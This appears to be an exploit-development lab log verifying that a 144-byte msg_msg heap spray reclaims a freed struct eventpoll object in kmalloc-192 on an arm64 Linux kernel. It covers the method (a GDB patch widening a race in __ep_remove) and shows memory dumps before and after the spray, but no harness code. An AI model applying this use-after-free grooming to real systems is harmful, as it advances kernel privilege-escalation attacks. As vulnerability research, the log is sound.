# EXP-018: msg_msg Spray Reclaim Verification

## Objective
Prove that a `msg_msg` allocation of 144 bytes of user data actually lands in `kmalloc-192` AND can reclaim a freed `struct eventpoll` slot.

## Methodology
1. Created harness `test_exp018.c` that sets up a 144-byte `msg_msg` spray loop in a separate thread.
2. Created GDB script `exp018_gdb.py` to intercept `__ep_remove` + 0x19c, patch the instruction to an infinite loop, wait for `ep_free` in the other thread, then resume.
3. Examined memory at the freed `struct eventpoll` address before and after the spray.

## Results
```
[*] Thread B finished ep_free. target_epoll is now FREED!
[*] Memory dump of freed struct eventpoll (BEFORE spray):
[*] 
0xffff0000036bdb40:	0x0000000000000000	0x0000000000000000
0xffff0000036bdb50:	0xffff0000036bdb50	0xffff0000036bdb50
0xffff0000036bdb60:	0x0000000000000000	0xffff0000036bdb68
0xffff0000036bdb70:	0xffff0000036bdb68	0x0000000000000000
0xffff0000036bdb80:	0xffff0000036bdb80	0xffff0000036bdb80
0xffff0000036bdb90:	0xffff0000036bdb90	0xffff0000036bdb90
0xffff0000036bdba0:	0xffff0000036bda80	0x0000000000000000
0xffff0000036bdbb0:	0x0000000000000000	0xffffffffffffffff
0xffff0000036bdbc0:	0x0000000000000000	0xffff80008152be98
0xffff0000036bdbd0:	0xffff0000024e00c0	0x0000000000000001
0xffff0000036bdbe0:	0xffff0000036df450	0x0000000000000000
0xffff0000036bdbf0:	0x0000000000000000	0x0000000000000000

[*] Timer fired! Interrupting GDB to check spray...

Thread 2 received signal SIGINT, Interrupt.
[Switching to Thread 1.2]
cpu_do_idle () at arch/arm64/kernel/idle.c:32
32		arm_cpuidle_restore_irq_context(&context);
[*] Interrupted! Dumping memory (AFTER spray):
[*] 
0xffff0000036bdb40:	0xffff0000036bda80	0xffff000003732bc0
0xffff0000036bdb50:	0x0000000000000001	0x0000000000000090
0xffff0000036bdb60:	0x0000000000000000	0xffff0000036de0f0
0xffff0000036bdb70:	0x4141414141414141	0x4141414141414141
0xffff0000036bdb80:	0x4141414141414141	0x4141414141414141
0xffff0000036bdb90:	0x4141414141414141	0x4141414141414141
0xffff0000036bdba0:	0x4141414141414141	0x4141414141414141
0xffff0000036bdbb0:	0x4141414141414141	0x4141414141414141
0xffff0000036bdbc0:	0x4141414141414141	0x4141414141414141
0xffff0000036bdbd0:	0x4141414141414141	0x4141414141414141
0xffff0000036bdbe0:	0x4141414141414141	0x4141414141414141
0xffff0000036bdbf0:	0x4141414141414141	0x4141414141414141
```

## Analysis
The memory at the freed eventpoll address changes from kernel data to the `0x41` pattern after `msgsnd()` spray. `0xffff0000036bdb70` is exactly offset 0x30 (48 bytes) from the allocation start at `0xffff0000036bdb40`, which is where the `msg_msg` user data payload begins. The `msg_msg` allocations are definitely successfully reclaiming the freed `struct eventpoll` objects.

## Conclusion
PASSED. The spray successfully reclaims the object in `kmalloc-192`.
